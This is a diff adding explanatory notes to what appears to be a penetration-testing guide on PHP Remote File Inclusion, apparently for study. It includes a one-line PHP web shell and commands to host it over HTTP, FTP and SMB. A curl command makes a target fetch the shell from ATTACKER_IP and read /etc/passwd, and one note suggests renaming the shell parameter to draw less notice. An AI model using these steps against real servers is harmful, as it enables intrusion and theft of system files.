@@ -10,6 +10,8 @@
 | PHP setting required | None | `allow_url_include=On` |
 | Outcome | Source disclosure, sometimes RCE via wrappers | Direct RCE — attacker hosts the payload |
 
+Local File Inclusion (LFI) reads files from the server's own filesystem. Remote File Inclusion (RFI) fetches and executes a file from an attacker-controlled URL.
+
 Every RFI is also an LFI. Not every LFI is RFI — three blockers:
 1. The sink doesn't support remote URLs (e.g., `file_get_contents()` for read but `include` blocked)
 2. The input is constrained (only filename portion is user-controlled)
@@ -34,6 +36,7 @@ Always test with a **local** URL first to avoid firewall noise:
 ```bash
 curl "http://TARGET/index.php?language=http://127.0.0.1:80/index.php"
 ```
+> Confirms RFI by including the target's own page. If the page content appears twice in the response, the server fetched and rendered the remote URL — RFI is confirmed. Avoids exposing your attacker IP during testing.
 
 If the included page renders inside the original response (e.g., the header section appears twice), RFI is confirmed.
 
@@ -49,6 +52,7 @@ If the included page renders inside the original response (e.g., the header sect
 mkdir /tmp/rfi_shell
 echo '<?php system($_GET["cmd"]); ?>' > /tmp/rfi_shell/shell.php
 ```
+> Creates a minimal PHP command-execution web shell that the target will fetch and run via RFI — change the `cmd` parameter name if you want a less obvious shell.
 
 ### Step 2 — Host it
 
@@ -58,18 +62,21 @@ cd /tmp/rfi_shell
 python3 -m http.server 8888 &
 # Use port 80/443 if firewall blocks high ports; needs sudo for <1024
 ```
+> Starts a simple HTTP server in the current directory on port 8888. The target server will fetch `shell.php` from this URL. Use a lower port if outbound high ports are firewalled (requires sudo for ports below 1024).
 
 #### Option B: FTP (when HTTP filtered)
 ```bash
 python3 -m pyftpdlib -p 21
 # PHP authenticates anonymously by default; for creds: ftp://user:pass@HOST/shell.php
 ```
+> Hosts the shell over FTP. Useful when outbound HTTP is blocked but FTP is not. PHP can authenticate anonymously by default.
 
 #### Option C: SMB (Windows targets — no `allow_url_include` needed)
 ```bash
 impacket-smbserver -smb2support share /tmp/rfi_shell
 # Include via UNC: \\ATTACKER_IP\share\shell.php
 ```
+> Hosts the shell over SMB using Impacket. On Windows, PHP can include files via UNC paths (`\\IP\share\file`) without needing `allow_url_include`. Useful when other methods are blocked.
 
 ### Step 3 — Trigger inclusion
 
@@ -82,6 +89,7 @@ curl -sk -G "http://TARGET/index.php" \
   --data-urlencode "language=http://ATTACKER_IP:8888/shell.php" \
   --data-urlencode "cmd=cat /etc/passwd"
 ```
+> Triggers the RFI by setting `language` to the attacker-hosted shell URL. Appending `&cmd=id` runs the `id` command via the web shell. Use `-G --data-urlencode` for commands with spaces or special characters to avoid manual encoding.
 
 ### Step 4 — Confirm payload was fetched
 
